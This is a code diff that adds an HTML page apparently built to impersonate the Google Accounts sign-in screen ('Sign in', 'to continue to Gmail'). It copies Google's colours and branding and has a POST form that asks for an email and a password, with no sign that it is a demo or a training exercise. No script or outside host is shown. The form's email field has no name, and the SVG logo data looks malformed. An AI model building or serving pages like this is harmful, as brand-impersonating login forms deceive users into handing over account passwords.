@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <link href="data:;base64,iVBORw0KGgo=" rel="icon" />
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', 'Noto', Arial, sans-serif;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 25%, #fbbc05 50%, #ea4335 75%, #4285f4 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 48px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 32px;
+        }
+
+        .logo img {
+            height: 44px;
+            width: auto;
+        }
+
+        h1 {
+            color: #202124;
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            font-size: 18px;
+            margin-bottom: 40px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            height: 56px;
+            padding: 0 16px;
+            border: 2px solid #dadce0;
+            border-radius: 28px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #fafbfc;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+            background: white;
+        }
+
+        .btn {
+            width: 100%;
+            height: 48px;
+            background: linear-gradient(135deg, #1a73e8, #1967d2);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 16px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(26, 115, 232, 0.4);
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 24px;
+                margin: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo"><svg fill="none" height="32" viewBox="0 0 272 92" width="92">
+                <path
+                    d="M111.16 75.94c-2.02 2.1-5.40 3.16-10.42 3.16-8.55 0-15.42-4.26-20.55-12.74l0-38.46h18.09v48.42c1.49 4.91 4.68 7.37 9.88 7.37 3.40 0 6.06-1.28 7.99-3.83l3.01-3.98h0v-35.92h18.09v55.78h-18.09Z"
+                    fill="#4285F4"></path>
+                <path
+                    d="M74.42 53.5c0 10.55-6.70 17.43-16.02 17.43-3.81 0-7.17-1.49-9.66-4.19l-0.70 16.74c2.55 1.06 6.38 1.70 10.88 1.70 11.83 0 20.55-7.45 20.55-18.7v-13.98h-18.09v-7.49c0-9.91 7.17-14.83 14.49-14.83 4.04 0 7.60 1.06 10.16 2.55l-1.28-16.74c-1.91-2.13-5.11-5.32-10.88-5.32-8.16 0-14.07 5.74-14.07 14.56v8.16h-18.09v13.98Z"
+                    fill="#34A853"></path>
+                <path d="M53.69 0h36.22v18.09h-36.22V0Z" fill="#FBBC05"></path>
+                <path d="m50.87 26.47.70 16.74h-16.74V26.47h16.04Z" fill="#EA4335"></path>
+                <path
+                    d="M34.53 43.24c0 10.55-6.70 17.43-16.02 17.43s-16.02-6.88-16.02-17.43 6.70-17.43 16.02-17.43 16.02 6.88 16.02 17.43Zm-25.36 0c0 6.38 3.19 11.28 7.66 14.56v-12.74h14.07c-.85-4.68-3.83-8.16-8.85-10.16-5.32-2.13-8.16-5.11-8.16-10.42 0-6.38 3.83-11.28 8.51-14.56 4.68-3.19 10.73-3.19 15.64 0l1.28-16.74c-2.98-2.13-6.70-3.40-10.88-3.40-8.85 0-16.02 5.74-16.02 14.56 0 5.74 2.55 10.73 6.38 14.07 4.26 3.40 7.66 7.45 7.66 13.19 0 4.26-2.13 8.16-5.74 10.73-1.49.85-3.40 2.13-5.32 2.55v12.74c4.68-3.19 8.16-7.66 8.16-14.07Z"
+                    fill="#4285F4"></path>
+            </svg></div>
+
+        <h1>Sign in</h1>
+
+        <div class="subtitle">to continue to Gmail</div>
+
+        <form action="" id="loginForm" method="POST">
+            <div class="form-group"><input autocomplete="email" placeholder="Email or phone" required="" type="email" />
+            </div>
+
+            <div class="form-group"><input autocomplete="current-password" name="password" placeholder="Password"
+                    required="" type="password" /></div>
+            <button class="btn" type="submit">Next</button>
+        </form>
+
+        <div class="footer"><a href="#" style="color: #1a73e8; text-decoration: none;">Forgot email?</a></div>
+    </div>
+
+
+</body>
+
+</html>
